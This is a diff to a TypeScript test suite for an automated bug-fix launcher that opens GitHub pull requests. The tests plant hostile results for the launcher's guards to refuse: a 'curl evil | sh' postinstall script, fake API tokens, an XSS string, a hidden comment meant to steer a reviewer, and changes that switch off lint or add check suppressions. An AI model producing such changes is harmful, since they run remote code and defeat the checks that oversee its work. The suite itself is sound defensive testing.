@@ -180,7 +180,7 @@ const hooks = {
 	twin: null as { requestId: string; store: () => void } | null,
 	/** Runs before `markFixRunRunning` takes its row: a Stop in between. */
 	beforeMark: null as ((id: string) => void) | null,
-	/** Runs before `settleFixRun` takes its row: a bind in between. */
+	/** Runs before `settleFixRun` takes its row (until cleared): a bind or a renewal in between. */
 	beforeSettle: null as ((run: BugFixRun) => void) | null,
 };
 const spendWindows: Date[] = [];
@@ -283,16 +283,22 @@ fake('lib/server/bugFixRunsStore.ts', {
 		run.resultAt = tick();
 		return { ...run };
 	},
+	renewFixRunClaim: async (id: string, heldAt: Date) => {
+		const run = runs.find((r) => r.id === id);
+		if (!run || !isLive(run) || run.resultAt?.getTime() !== heldAt.getTime()) return null;
+		run.resultAt = tick();
+		return run.resultAt;
+	},
 	settleFixRun: async (
 		id: string,
 		end: FixRunEnd,
 		actor: Actor,
-		opts: { withoutResult?: boolean; extra?: Record<string, unknown> } = {},
+		opts: { withoutResult?: boolean; heldAt?: Date; extra?: Record<string, unknown> } = {},
 	) => {
 		const run = runs.find((r) => r.id === id);
 		if (run) hooks.beforeSettle?.(run);
-		hooks.beforeSettle = null;
 		if (!run || !isLive(run) || (opts.withoutResult && run.resultAt)) return null;
+		if (opts.heldAt && run.resultAt?.getTime() !== opts.heldAt.getTime()) return null;
 		Object.assign(run, {
 			status: end.status,
 			outcome: end.outcome ?? null,
@@ -423,6 +429,7 @@ const accounts: Record<string, string> = {
 	'u-admin': 'Gualtiero',
 	'u-fixer': '@fia',
 	'u-skip': 'Ann [skip ci] [skip [skip ci]ci]',
+	'u-leak': `ghp_${'E'.repeat(36)}`,
 };
 const grants: Record<string, string[]> = {
 	'u-admin': ['cloud', 'borut', 'secret', 'tiny'],
@@ -469,6 +476,12 @@ interface Failure {
 	headers?: Record<string, string>;
 	lost?: true;
 }
+/** A call held until the test lets it go: a request still working while others arrive. */
+interface Gate {
+	key: string;
+	reached: () => void;
+	release: Promise<void>;
+}
 const BASE = 'b'.repeat(40);
 const BOT = 'invisible-pipeline[bot]';
 const gh = {
@@ -490,6 +503,11 @@ const gh = {
 	n: 0,
 	commitTrees: new Map<string, string>(),
 	lastBranchCommit: '',
+	/** The branches the App made, by name: the commit each points at. */
+	refs: new Map<string, string>(),
+	/** Calls held until released, each once. */
+	gates: [] as Gate[],
+	slugFails: false,
 };
 function answer(status: number, body?: unknown, headers: Record<string, string> = {}): Response {
 	return new Response(body === undefined || status === 204 ? null : JSON.stringify(body), {
@@ -561,14 +579,27 @@ async function route(method: string, path: string, body: Record<string, unknown>
 		gh.commitTrees.set(sha, String(body?.tree));
 		return answer(201, { sha });
 	}
-	if (method === 'POST' && path === `${R}/git/refs`) return answer(201, {});
-	if ((m = /\/git\/refs\/heads\/(.+)$/.exec(path)) && method === 'DELETE') return answer(204);
+	if (method === 'POST' && path === `${R}/git/refs`) {
+		const name = String(body?.ref).replace('refs/heads/', '');
+		if (gh.refs.has(name)) return answer(422, { message: 'Reference already exists' });
+		gh.refs.set(name, String(body?.sha));
+		return answer(201, {});
+	}
+	if ((m = /\/git\/refs\/heads\/(.+)$/.exec(path)) && method === 'DELETE') {
+		gh.refs.delete(m[1]);
+		return answer(204);
+	}
 	if ((m = /\/git\/ref\/heads\/(.+)$/.exec(path)) && method === 'GET') {
+		const made = gh.refs.get(m[1]);
+		if (made) return answer(200, { object: { sha: made } });
 		return gh.branchExists
 			? answer(200, { object: { sha: gh.lastBranchCommit } })
 			: answer(404, { message: 'Not Found' });
 	}
 	if (method === 'POST' && path === `${R}/pulls`) {
+		if (gh.pulls.some((p) => p.head === body?.head)) {
+			return answer(422, { message: 'A pull request already exists' });
+		}
 		const number = 700 + gh.pulls.length;
 		gh.pulls.push({
 			number,
@@ -601,6 +632,12 @@ const app = {
 			typeof init.body === 'string' ? (JSON.parse(init.body) as Record<string, unknown>) : null;
 		const call = { method, path, body };
 		gh.calls.push(call);
+		const gate = gh.gates.find((g) => g.key === callKey(call));
+		if (gate) {
+			gh.gates.splice(gh.gates.indexOf(gate), 1);
+			gate.reached();
+			await gate.release;
+		}
 		const queued = gh.fail.get(callKey(call))?.shift();
 		if (queued?.lost) throw new realGithubApp.GithubAppError('GitHub did not answer (timed out).');
 		if (queued) {
@@ -619,10 +656,25 @@ const app = {
 	download: async () => {
 		throw new Error('not used');
 	},
-	slug: async () => 'invisible-pipeline',
+	slug: async () => {
+		if (gh.slugFails) throw new realGithubApp.GithubAppError('GitHub 401: Bad credentials', 401);
+		return 'invisible-pipeline';
+	},
 };
 fake('lib/server/githubApp.ts', { ...realGithubApp, githubApp: app });
 const queue = (key: string, ...failures: Failure[]) => gh.fail.set(key, failures);
+/** Hold the next `key` call: `arrived` once a request is held there, `release` lets it go on. */
+function holdAt(key: string): { arrived: Promise<void>; release: () => void } {
+	let arrive = () => {};
+	let release = () => {};
+	const arrived = new Promise<void>((done) => (arrive = done));
+	gh.gates.push({
+		key,
+		reached: () => arrive(),
+		release: new Promise<void>((done) => (release = done)),
+	});
+	return { arrived, release: () => release() };
+}
 
 // ── GitHub OIDC: a key of our own, served as GitHub's JWKS ────────────────────
 const KID = 'fixture-key';
@@ -682,6 +734,7 @@ const bugShared = await import(src('lib/bugReports.ts'));
 const roles = await import(src('lib/roles.ts'));
 const reports = await import(src('lib/server/bugReports.ts'));
 const server = await import(src('lib/server/bugFixRuns.ts'));
+const change = await import(src('lib/server/bugFixRunsChange.ts'));
 const actions = await import(src('lib/server/bugFixRunsActions.ts'));
 const view = await import(src('routes/(app)/bugs/view.ts'));
 const startRoute = await import(src('routes/api/bugs/[number]/fix-runs/+server.ts'));
@@ -859,20 +912,32 @@ putBase('docs/readme.md', 'readme\n');
 putBase('docs/file.md', 'a file\n');
 putBase('tools/link', '../elsewhere', '120000');
 putBase('vendor/sub', '', '160000', 'commit');
+/** The base's root scripts: `lint` is what CI's Lint runs. */
+const baseScripts = {
+	a: 'x',
+	lint: 'eslint apps packages services',
+	postinstall: 'node setup.mjs',
+};
+const SHY = String.fromCodePoint(0xad);
+const E_ACUTE = String.fromCodePoint(0xe9);
 putBase(
 	'package.json',
 	JSON.stringify({
 		name: 'root',
 		packageManager: 'pnpm@10.5.0',
 		engines: { node: '>=22' },
-		scripts: { a: 'x', postinstall: 'node setup.mjs' },
+		scripts: baseScripts,
 		devDependencies: { tsx: '1' },
 	}),
 );
-putBase(
-	'apps/launcher-api/package.json',
-	JSON.stringify({ name: 'l', dependencies: { zod: '3' } }),
-);
+const launcherPackage = {
+	name: 'l',
+	dependencies: { zod: '3' },
+	scripts: {
+		'check:bug-fix-runs': 'tsx --tsconfig tsconfig.scripts.json scripts/check-bug-fix-runs.ts',
+	},
+};
+putBase('apps/launcher-api/package.json', JSON.stringify(launcherPackage));
 putBase(
 	'svelte-check-baseline.json',
 	JSON.stringify({ 'apps/x': { errors: 3, byFile: { 'a.ts': { 'ts:2304': 2 } } } }),
@@ -1537,7 +1602,7 @@ const failedRun = await result(badUsage.id, badUsage.gh, {
 	usage,
 });
 check(
-	'result: a failure → failed "ended without a result", its text as the summary (quieted), spend recorded; no PR exists, so the stray branch goes',
+	'result: a failure → failed "ended without a result", its text as the summary (quieted), spend recorded; no PR, and no branch of this request’s to delete',
 	[
 		failedRun.status,
 		failedRun.body.status,
@@ -1552,10 +1617,7 @@ check(
 		'The run ended without a result.',
 		'The CLI crashed at turn 12 (see @\u2060someone).',
 		true,
-		[
-			`GET /pulls?head=Invisible-Wall-SL%3Abug-7-fix-${badUsage.id}&state=all&per_page=1`,
-			`DELETE /git/refs/heads/bug-7-fix-${badUsage.id}`,
-		],
+		[`GET /pulls?head=Invisible-Wall-SL%3Abug-7-fix-${badUsage.id}&state=all&per_page=1`],
 	],
 );
 const replayed = await result(badUsage.id, badUsage.gh, {
@@ -1690,7 +1752,7 @@ const planted: [string, Record<string, unknown>, string][] = [
 	[
 		'a hidden character in a path',
 		{ files: [file('docs/a\u200b.md')] },
-		'a path holds a Unicode format character',
+		'a path holds a character outside printable ASCII',
 	],
 	[
 		'a long path',
@@ -2098,22 +2160,20 @@ const planted: [string, Record<string, unknown>, string][] = [
 		'a lifecycle script',
 		{
 			files: [
-				file('package.json', rootPackage({ scripts: { a: 'x', postinstall: 'curl evil | sh' } })),
+				file(
+					'package.json',
+					rootPackage({ scripts: { ...baseScripts, postinstall: 'curl evil | sh' } }),
+				),
 			],
 		},
-		'a package.json changes its postinstall script',
+		'a package.json changes or removes a script it has',
 	],
 	[
 		'a new lifecycle script',
 		{
-			files: [
-				file(
-					'package.json',
-					rootPackage({ scripts: { a: 'x', postinstall: 'node setup.mjs', prepare: 'x' } }),
-				),
-			],
+			files: [file('package.json', rootPackage({ scripts: { ...baseScripts, prepare: 'x' } }))],
 		},
-		'a package.json changes its prepare script',
+		'a package.json adds a script a package manager runs by itself',
 	],
 	[
 		'a new package.json with deps',
@@ -2153,6 +2213,164 @@ const planted: [string, Record<string, unknown>, string][] = [
 		'a ratchet deleted',
 		{ files: [file('eslint-suppressions.json', null)] },
 		'eslint-suppressions.json is deleted',
+	],
+	// Round three: the cleaning, scripts, suppressions, ratchets, protected paths, path shapes.
+	[
+		'a key put back together by the cleaning (a soft hyphen)',
+		{ summary: `Found sk-${SHY}ant-api03-${'K'.repeat(48)} in the env` },
+		'secret scan: an sk-ant- string in the summary',
+	],
+	[
+		'a key put back together by the cleaning (an empty tag)',
+		{ lesson: `- key: sk-<b></b>ant-api03-${'K'.repeat(48)}` },
+		'secret scan: an sk-ant- string in the lesson',
+	],
+	[
+		'the lint script switched off',
+		{ files: [file('package.json', rootPackage({ scripts: { ...baseScripts, lint: 'true' } }))] },
+		'a package.json changes or removes a script it has',
+	],
+	[
+		'a fixture script switched off',
+		{
+			files: [
+				file(
+					'apps/launcher-api/package.json',
+					JSON.stringify({
+						...launcherPackage,
+						scripts: { 'check:bug-fix-runs': 'true scripts/check-bug-fix-runs.ts' },
+					}),
+				),
+			],
+		},
+		'a package.json changes or removes a script it has',
+	],
+	[
+		'a script removed',
+		{
+			files: [
+				file('package.json', rootPackage({ scripts: { a: 'x', postinstall: 'node setup.mjs' } })),
+			],
+		},
+		'a package.json changes or removes a script it has',
+	],
+	[
+		'a new pre- script',
+		{ files: [file('package.json', rootPackage({ scripts: { ...baseScripts, prelint: 'x' } }))] },
+		'a package.json adds a script a package manager runs by itself',
+	],
+	[
+		'a new post- script',
+		{ files: [file('package.json', rootPackage({ scripts: { ...baseScripts, postbuild: 'x' } }))] },
+		'a package.json adds a script a package manager runs by itself',
+	],
+	[
+		'a new pnpm: script',
+		{
+			files: [
+				file(
+					'package.json',
+					rootPackage({ scripts: { ...baseScripts, 'pnpm:devPreinstall': 'x' } }),
+				),
+			],
+		},
+		'a package.json adds a script a package manager runs by itself',
+	],
+	[
+		'an existing suppression copied again',
+		{ files: [file(ORDER, `${ORDER_BASE}// eslint-disable-next-line no-console\n`)] },
+		'it adds a suppression comment (eslint-disable)',
+	],
+	[
+		'a suppression in upper case',
+		{ files: [file(ORDER, `// @TS-NOCHECK\n${ORDER_BASE}`)] },
+		'it adds a suppression comment (@ts-nocheck)',
+	],
+	[
+		'an ESLint rule switched off inline',
+		{ files: [file(ORDER, `/* eslint svelte/prefer-svelte-reactivity: "off" */\n${ORDER_BASE}`)] },
+		'it adds an ESLint configuration comment',
+	],
+	[
+		'an inline global',
+		{ files: [file(ORDER, `/* global window */\n${ORDER_BASE}`)] },
+		'it adds an ESLint configuration comment',
+	],
+	[
+		'an inline environment',
+		{ files: [file(ORDER, `// eslint-env node\n${ORDER_BASE}`)] },
+		'it adds an ESLint configuration comment',
+	],
+	[
+		'an ESLint comment in markup',
+		{ files: [file('apps/x/B.svelte', '<!-- eslint no-x: off -->\n')] },
+		'it adds an ESLint configuration comment',
+	],
+	[
+		'a ratchet count written as text',
+		{
+			files: [
+				file(
+					'svelte-check-baseline.json',
+					JSON.stringify({ 'apps/x': { errors: 3, byFile: { 'a.ts': { 'ts:2304': '99' } } } }),
+				),
+			],
+		},
+		'svelte-check-baseline.json holds a count that is not a number',
+	],
+	[
+		'a ratchet growth hidden by a slash-joined twin',
+		{
+			files: [
+				file(
+					'svelte-check-baseline.json',
+					JSON.stringify({
+						'apps/x': { errors: 3, byFile: { 'a.ts': { 'ts:2304': 9 }, 'a.ts/ts:2304': 1 } },
+					}),
+				),
+			],
+		},
+		'svelte-check-baseline.json grows',
+	],
+	[
+		"the job's routes",
+		{ files: [file('apps/launcher-api/src/routes/api/pipeline/fix-runs/[id]/brief/+server.ts')] },
+		'it touches a protected path (apps/launcher-api/src/routes/api/pipeline/fix-runs)',
+	],
+	[
+		'the Start and Stop routes',
+		{ files: [file('apps/launcher-api/src/routes/api/bugs/[number]/fix-runs/+server.ts')] },
+		'it touches a protected path (apps/launcher-api/src/routes/api/bugs/[number]/fix-runs)',
+	],
+	[
+		"the worker's untrusted-text wrapper",
+		{ files: [file('services/director-worker/src/untrusted.ts')] },
+		'it touches a protected path (services/director-worker/src/untrusted.ts)',
+	],
+	[
+		'the bug-reports fixture',
+		{ files: [file('apps/launcher-api/scripts/check-bug-reports.ts')] },
+		'it touches a protected path (apps/launcher-api/scripts/check-bug-reports.ts)',
+	],
+	[
+		'a migration',
+		{ files: [file('apps/launcher-api/drizzle/0038_more.sql')] },
+		'it touches a protected path (apps/launcher-api/drizzle)',
+	],
+	[
+		'a path outside ASCII',
+		{ files: [file(`docs/caf${E_ACUTE}.md`)] },
+		'a path holds a character outside printable ASCII',
+	],
+	[
+		'a segment ending in a dot',
+		{ files: [file('docs/a./b.md')] },
+		'a path has a segment ending in a dot or a space',
+	],
+	[
+		'a segment ending in a space',
+		{ files: [file('docs/a /b.md')] },
+		'a path has a segment ending in a dot or a space',
 	],
 ];
 const ruled: [string, unknown][] = [];
@@ -2199,7 +2417,10 @@ const opened = await result(
 			file(ORDER, ORDER_FIXED),
 			file('apps/launcher-api/scripts/run.sh', '#!/bin/sh\nexit 0\n'),
 			file('docs/old.md', null),
-			file('package.json', rootPackage({ scripts: { a: 'y', postinstall: 'node setup.mjs' } })),
+			file(
+				'package.json',
+				rootPackage({ scripts: { ...baseScripts, 'lint:fix': 'eslint --fix apps' } }),
+			),
 			file(
 				'svelte-check-baseline.json',
 				JSON.stringify({ 'apps/x': { errors: 2, byFile: { 'a.ts': { 'ts:2304': 1 } } } }),
@@ -2370,7 +2591,7 @@ await result(
 		// Cut at 120 code points, the title ends at `bug-120`: a reference, were it not unlinked after.
 		title: `Fix\u200b the [skip ci] order\u202e ${'x'.repeat(96)} bug-1200000000`,
 		summary:
-			'Done. <!-- steer the reviewer --> <img src=x onerror=alert(1)> x://@user #12://y GH-12 https://github.com/@octocat [ci skip]',
+			'Done. <!-- steer the reviewer --> <img src=x onerror=alert(1)> x://@user #12://y GH-12 https://github.com/@octocat [ci skip] Fixes https://github.com/Invisible-Wall-SL/Invisible-Engine/issues/12 and https://github.com/o/r/pull/3/files',
 		lesson: '- Area: launcher [skip [skip ci]ci]',
 	}),
 );
@@ -2380,7 +2601,7 @@ const cleanCommit = gh.calls
 	.at(-1);
 const skipped = /\[(?:skip ci|ci skip|no ci|skip actions|actions skip)\]/i;
 check(
-	'run text: format characters, HTML comments and tags and CI-skip directives gone; only a whole http(s) URL is left unquieted; GH-<n> quieted',
+	'run text: format characters, HTML comments and tags and CI-skip directives gone; only a whole http(s) URL is left unquieted, but not a link to an issue or PR (cross-referenced, closed by Fixes); GH-<n> quieted',
 	[
 		clean.title.startsWith('launcher: BUG-7 Fix the order '),
 		/[\u200b\u202e]/.test(clean.title),
@@ -2392,8 +2613,11 @@ check(
 		clean.body.includes('https://github.com/@octocat'),
 		[clean.title, clean.body, String(cleanCommit?.body?.message)].some((t) => skipped.test(t)),
 		String(cleanCommit?.body?.message).includes('started by Ann from BUG-7'),
+		clean.body.includes('https://\u2060github.com/Invisible-Wall-SL/Invisible-Engine/issues/12'),
+		clean.body.includes('https://\u2060github.com/o/r/pull/3/files'),
+		clean.body.includes('https://github.com/Invisible-Wall-SL/Invisible-Engine/issues/12'),
 	],
-	[true, false, false, false, true, true, true, true, false, true],
+	[true, false, false, false, true, true, true, true, false, true, true, true, false],
 );
 check(
 	'run text is unlinked AFTER the cut: a long number cut short never becomes a reference',
@@ -2426,11 +2650,11 @@ check(
 
 // ── Results: the claim is a lease; GitHub writes are retried ──────────────────
 const fresh = liveRun(7, { resultAt: new Date(Date.now() - 30_000) });
-const stale = liveRun(7, { resultAt: new Date(Date.now() - 3 * MIN) });
+const stale = liveRun(7, { resultAt: new Date(Date.now() - 6 * MIN) });
 const freshAnswer = await result(fresh.id, fresh.gh, good());
 const staleAnswer = await result(stale.id, stale.gh, good());
 check(
-	'the claim is a lease: one held for 30 s → 409; one held for over 2 minutes is taken over and finished',
+	'the claim is a lease: one renewed 30 s ago → 409; one not renewed for over 5 minutes is taken over and finished',
 	[freshAnswer.status, staleAnswer.body.status],
 	[409, 'pr_opened'],
 );
@@ -2469,19 +2693,14 @@ sleeps.length = 0;
 gh.calls.length = 0;
 const limitedAnswer = await resultDirect(limited.id, limited.gh, good());
 check(
-	'a rate limit asking for more than 10 s is not waited out: failed in GitHub’s words, no PR, the stray branch deleted',
+	'a rate limit asking for more than 10 s is not waited out: failed in GitHub’s words, no PR; no commit was made, so no branch is deleted',
 	[
 		limitedAnswer.body.status,
 		runOf(limited.id).reason,
 		sleeps,
 		writes().filter((w) => w.startsWith('DELETE')),
 	],
-	[
-		'failed',
-		'GitHub 429 making the commit: You have exceeded a secondary rate limit',
-		[],
-		[`DELETE /git/refs/heads/bug-7-fix-${limited.id}`],
-	],
+	['failed', 'GitHub 429 making the commit: You have exceeded a secondary rate limit', [], []],
 );
 const opensAnyway = liveRun(7);
 queue('POST /git/commits', { status: 500 }, { status: 500 }, { status: 500 });
@@ -2513,11 +2732,16 @@ const raceRun = liveRun(1);
 queue('POST /git/refs', { status: 422, message: 'Reference already exists' });
 gh.lastBranchCommit = 'commit-of-race';
 gh.commitTrees.set('commit-of-race', 'tree-that-differs');
+gh.calls.length = 0;
 const branchTaken = await resultDirect(raceRun.id, raceRun.gh, good());
 check(
-	'a branch GitHub already holds with another change → failed with that sentence, no PR',
-	[branchTaken.body.status, runOf(raceRun.id).reason],
-	['failed', `GitHub already has the branch bug-1-fix-${raceRun.id} with another change.`],
+	'a branch GitHub already holds with another change → failed with that sentence, no PR, and that branch (not this request’s commit) left',
+	[
+		branchTaken.body.status,
+		runOf(raceRun.id).reason,
+		writes().filter((w) => w.startsWith('DELETE')),
+	],
+	['failed', `GitHub already has the branch bug-1-fix-${raceRun.id} with another change.`, []],
 );
 const reuseRun = liveRun(1);
 queue('POST /git/refs', { status: 422, message: 'Reference already exists' });
@@ -2564,6 +2788,126 @@ check(
 	'a result that unpacks past 2 MB → 413, nothing claimed',
 	[huge413.status, runOf(bigRun.id).resultAt],
 	[413, null],
+);
+
+// ── Results: round three — the last secret look, field caps, strays, the live lease ─
+const leaky = liveRun(7, { startedById: 'u-leak' });
+gh.calls.length = 0;
+const leakAnswer = await result(leaky.id, leaky.gh, good());
+check(
+	'the last look before anything is written: a secret in what will be published (here in the name) → refused, nothing written',
+	[leakAnswer.body.status, runOf(leaky.id).reason, writes()],
+	['no_fix', 'The change was refused (secret scan: GitHub token in the commit message).', []],
+);
+const longField = liveRun(7);
+const tooLong = await result(longField.id, longField.gh, good({ summary: 'x'.repeat(8001) }));
+const tooLongGate = await result(
+	longField.id,
+	longField.gh,
+	good({ gates: [{ command: 'y'.repeat(1201), ok: true }] }),
+);
+check(
+	'a text field over 4 times what is kept is refused unread (400 naming the field), nothing claimed',
+	[
+		tooLong.status,
+		tooLong.body.error,
+		tooLongGate.status,
+		tooLongGate.body.error,
+		runOf(longField.id).resultAt,
+	],
+	[
+		400,
+		"The result's summary is far longer than the launcher keeps.",
+		400,
+		"The result's gate command is far longer than the launcher keeps.",
+		null,
+	],
+);
+const nestedTags = '<'.repeat(40_000) + 'a>'.repeat(40_001);
+const nestedSkips = '[skip '.repeat(40_000) + 'ci]'.repeat(40_000);
+let started = Date.now();
+const cleanedTags = change.cleanText(nestedTags, 2000);
+const tagsMs = Date.now() - started;
+started = Date.now();
+const cleanedSkips = change.cleanText(nestedSkips, 2000);
+const skipsMs = Date.now() - started;
+check(
+	'the strip passes are bounded: 120 KB of nested tags and 360 KB of nested directives, built to make them quadratic, clean in well under a second, no bracket left',
+	[tagsMs < 1000, skipsMs < 1000, /[<>[\]]/.test(cleanedTags), /[<>[\]]/.test(cleanedSkips)],
+	[true, true, false, false],
+);
+const deletes = () => writes().filter((w) => w.startsWith('DELETE'));
+const lookupDown = liveRun(7);
+queue('POST /pulls', { status: 500 }, { status: 500 }, { status: 500 });
+queue(`GET /pulls?head=Invisible-Wall-SL%3Abug-7-fix-${lookupDown.id}&state=all&per_page=1`, {
+	status: 502,
+});
+gh.calls.length = 0;
+const lookupDownAnswer = await resultDirect(lookupDown.id, lookupDown.gh, good());
+check(
+	'a failure after the branch was made, GitHub unable to say whether a PR comes from it → failed, and the branch is NOT deleted',
+	[lookupDownAnswer.body.status, deletes(), gh.refs.has(`bug-7-fix-${lookupDown.id}`)],
+	['failed', [], true],
+);
+const strayRun = liveRun(7);
+queue('POST /pulls', { status: 500 }, { status: 500 }, { status: 500 });
+gh.calls.length = 0;
+const strayAnswer = await resultDirect(strayRun.id, strayRun.gh, good());
+check(
+	"a failure after the branch was made, GitHub answering that no PR comes from it and the branch still at this request's commit → failed, the stray deleted",
+	[strayAnswer.body.status, deletes(), gh.refs.has(`bug-7-fix-${strayRun.id}`)],
+	['failed', [`DELETE /git/refs/heads/bug-7-fix-${strayRun.id}`], false],
+);
+const held = liveRun(7);
+const atTree = holdAt('POST /git/trees');
+const firstPost = result(held.id, held.gh, good());
+await atTree.arrived;
+const secondPost = await result(held.id, held.gh, good());
+// The first holder went quiet past the stale time without renewing.
+runOf(held.id).resultAt = new Date(Date.now() - 6 * MIN);
+const thirdPost = await result(held.id, held.gh, good());
+const callsAtRelease = gh.calls.length;
+atTree.release();
+const firstAnswer = await firstPost;
+check(
+	'the lease, with its holder still working: a second post → 409; past the stale time a third takes over and opens the PR; the first, waking, writes nothing more and settles nothing (409)',
+	[
+		secondPost.status,
+		thirdPost.body.status,
+		firstAnswer.status,
+		gh.calls.slice(callsAtRelease).map(callKey),
+		gh.pulls.filter((p) => p.head === `bug-7-fix-${held.id}`).length,
+		runOf(held.id).status,
+		runOf(held.id).prNumber === thirdPost.body.prNumber,
+	],
+	[409, 'pr_opened', 409, [], 1, 'pr_opened', true],
+);
+// A holder held INSIDE its last write: it opens the PR, then finds its claim taken over. Its
+// settle holds to its own claim, so the run stays the new holder's to end.
+const lagging = liveRun(7);
+const atPull = holdAt('POST /pulls');
+const laggingPost = result(lagging.id, lagging.gh, good());
+await atPull.arrived;
+runOf(lagging.id).resultAt = new Date(Date.now() - 6 * MIN);
+const atBlob = holdAt('POST /git/blobs');
+const takeover = result(lagging.id, lagging.gh, good());
+await atBlob.arrived;
+atPull.release();
+const laggingAnswer = await laggingPost;
+const whileHeld = runOf(lagging.id).status;
+atBlob.release();
+const takeoverAnswer = await takeover;
+check(
+	'the lease: a holder that opens its PR after losing its claim does not settle the run; the new holder ends it, with that PR',
+	[
+		laggingAnswer.body.status,
+		whileHeld,
+		takeoverAnswer.body.status,
+		gh.pulls.filter((p) => p.head === `bug-7-fix-${lagging.id}`).length,
+		takeoverAnswer.body.prNumber ===
+			gh.pulls.find((p) => p.head === `bug-7-fix-${lagging.id}`)?.number,
+	],
+	['running', 'running', 'pr_opened', 1, true],
 );
 
 // ── Stop ──────────────────────────────────────────────────────────────────────
@@ -2654,18 +2998,31 @@ check(
 	[goneStop.status, runView(goneStop).status],
 	[200, 'cancelled'],
 );
+const LISTING = 'GET /actions/workflows/bug-fix.yml/runs?event=workflow_dispatch&per_page=50';
 const unbound = liveRun(7, { status: 'dispatched', ghRunId: null });
+gh.listed = null;
 gh.calls.length = 0;
 const unboundStopped = await stop(ADMIN, 7, unbound.id);
 check(
-	'stop: an unbound run → cancelled with no GitHub call',
-	[runView(unboundStopped).status, gh.calls.length],
-	['cancelled', 0],
+	'stop: an unbound run → cancelled; the workflow’s runs are looked through once, and none under its run-name means nothing to cancel',
+	[runView(unboundStopped).status, gh.calls.map(callKey)],
+	['cancelled', [LISTING]],
+);
+const startedUnbound = liveRun(7, { status: 'dispatched', ghRunId: null });
+gh.listed = [ghRun(9900, startedUnbound.id)];
+gh.calls.length = 0;
+await stop(ADMIN, 7, startedUnbound.id);
+gh.listed = [];
+check(
+	'stop: an unbound run whose Actions run did start (its run-name, the bot) → that Actions run cancelled too',
+	gh.calls.map(callKey),
+	[LISTING, 'POST /actions/runs/9900/cancel'],
 );
 const between = liveRun(7, { status: 'dispatched', ghRunId: null });
 hooks.beforeSettle = (run) => (run.ghRunId = 9999);
 gh.calls.length = 0;
 const betweenStopped = await stop(ADMIN, 7, between.id);
+hooks.beforeSettle = null;
 check(
 	'stop: a run bound between Stop reading it and settling it → its Actions run cancelled after, from the settled row',
 	[runView(betweenStopped).status, gh.calls.map(callKey)],
@@ -2733,8 +3090,19 @@ check(
 	],
 );
 const midWithPr = mk(3, 9606, { resultAt: new Date(bornAt + MIN) });
+const renewedMid = mk(3, 9608, { resultAt: new Date(bornAt + MIN) });
+hooks.beforeSettle = (run) => {
+	if (run.id === renewedMid) run.resultAt = tick();
+};
 gh.pulls.push({ number: 797, title: 't', head: `bug-3-fix-${midWithPr}`, body: '', draft: true });
 await actions.backstopFixRuns(app, bornAt + 16 * MIN);
+hooks.beforeSettle = null;
+check(
+	'backstop: a claim its holder renews between the backstop’s read and its settle is the holder’s: the run stays live',
+	runOf(renewedMid).status,
+	'running',
+);
+runOf(renewedMid).status = 'failed';
 check(
 	'backstop at 16 min: not found → failed "did not start"; a result claimed 15 min ago → failed "stopped while opening", or pr_opened when GitHub has its PR',
 	[
@@ -2759,6 +3127,19 @@ check(
 	[runOf(listingDown).status, runOf(boundWhileDown).reason],
 	['dispatched', 'The Actions run ended without a result.'],
 );
+gh.slugFails = true;
+const noBot = mk(7, null);
+const listedBefore = gh.listed;
+gh.listed = [ghRun(9950, 'someone-else')];
+await actions.backstopFixRuns(app, bornAt + 20 * MIN);
+gh.slugFails = false;
+gh.listed = listedBefore;
+check(
+	'backstop: runs listed but the App’s bot unknown (its slug failed) → an unbound run is left for the next pass, not ended “did not start”',
+	runOf(noBot).status,
+	'dispatched',
+);
+runOf(noBot).status = 'failed';
 runOf(listingDown).status = 'failed';
 gh.listed = null;
 const late = mk(1, null);
